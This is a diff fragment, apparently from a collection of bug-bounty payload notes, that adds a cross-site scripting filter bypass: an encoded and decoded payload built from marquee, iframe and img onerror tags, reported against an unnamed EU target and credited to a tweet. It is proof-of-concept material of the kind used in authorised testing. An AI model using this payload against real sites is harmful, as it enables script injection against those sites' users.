@@ -185,3 +185,17 @@ B[
 # # # # # #
 # # # # #  #
 20XX - 
+
+
+An EU BB target filtering everything except <marquee> tag.
+
+I found that placing encoded pl b/w marquee tags after an HTML tag will bypass the filter:
+
+"%3Cmarquee%3E%3C%2Fbr%3E%3C%2Fbr%3E%27%22%3E%22%3E%3Ciframe%3E%3Cimg%2Fsrc%2Fonerror%3Dalert%28document.domain%29%3E"
+
+Real payload (without encode)
+<marquee></br></br>'">"><iframe><img/src/onerror=alert(document.domain)>"
+
+Collected from,
+https://twitter.com/nav1n0x/status/1384079792882864128?s=19
+
